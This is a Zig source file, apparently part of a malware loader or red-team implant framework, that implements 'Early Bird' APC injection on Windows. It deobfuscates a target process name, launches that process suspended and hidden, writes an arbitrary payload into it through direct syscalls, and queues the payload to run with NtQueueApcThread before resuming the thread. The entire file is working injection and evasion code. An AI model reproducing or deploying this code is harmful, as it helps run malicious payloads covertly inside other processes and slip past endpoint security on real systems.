const std = @import("std");
const windows = std.os.windows;
const config = @import("config");
const Apis = @import("../api.zig").Apis;
const Syscalls = @import("../syscall.zig").Syscalls;
const win32 = @import("../win32.zig");
const mem = @import("../helper/mem.zig");
const deobfsBytes = @import("../helper/obfs.zig").deobfsBytes;
const string = @import("../helper/string.zig");

pub fn earlybird(apis: Apis, syscalls: Syscalls, payload: []const u8) !void {
    // Get target process
    const process_name = deobfsBytes(
        config.target_process_name_obfs.len,
        config.target_process_name_obfs,
        config.obfs_key,
    );
    const command_line = process_name[0..process_name.len];

    var si = win32.STARTUPINFOA{
        .cb = @sizeOf(win32.STARTUPINFOA),
        .lpReserved = null,
        .lpDesktop = null,
        .lpTitle = null,
        .dwX = 0,
        .dwY = 0,
        .dwXSize = 0,
        .dwYSize = 0,
        .dwXCountChars = 0,
        .dwYCountChars = 0,
        .dwFillAttribute = 0,
        .dwFlags = windows.STARTF_USESHOWWINDOW,
        .wShowWindow = win32.SW_HIDE,
        .cbReserved2 = 0,
        .lpReserved2 = null,
        .hStdInput = null,
        .hStdOutput = null,
        .hStdError = null,
    };
    var pi: windows.PROCESS_INFORMATION = undefined;

    const result = apis.CreateProcessA.?(
        null,
        @constCast(@ptrCast(command_line)),
        null,
        null,
        windows.FALSE,
        win32.CREATE_SUSPENDED,
        null,
        null,
        &si,
        &pi,
    );
    if (result == windows.FALSE) {
        return error.CreateProcessAFailed;
    }

    defer _ = mem.ntClose(syscalls, pi.hProcess);
    defer _ = mem.ntClose(syscalls, pi.hThread);

    // Write payloaad
    const page_size = 4096;
    const alloc_size = ((payload.len + page_size - 1) / page_size) * page_size;
    const addr_ptr = try mem.ntAllocWriteProtect(syscalls, pi.hProcess, alloc_size, windows.MEM_COMMIT | windows.MEM_RESERVE, payload);
    defer _ = mem.ntFreePtr(syscalls, addr_ptr);
    const apc_routine_ptr: *win32.PS_APC_ROUTINE = @alignCast(@ptrCast(addr_ptr));

    const status = syscalls.NtQueueApcThread.?.syscall6(
        @intFromPtr(pi.hThread),
        @intFromPtr(apc_routine_ptr),
        0, 0, 0, 0,
    );
    if (status != win32.STATUS_SUCCESS) {
        return error.NtQueueApcThreadFailed;
    }

    mem.ntResumeThread(syscalls, pi.hThread);
}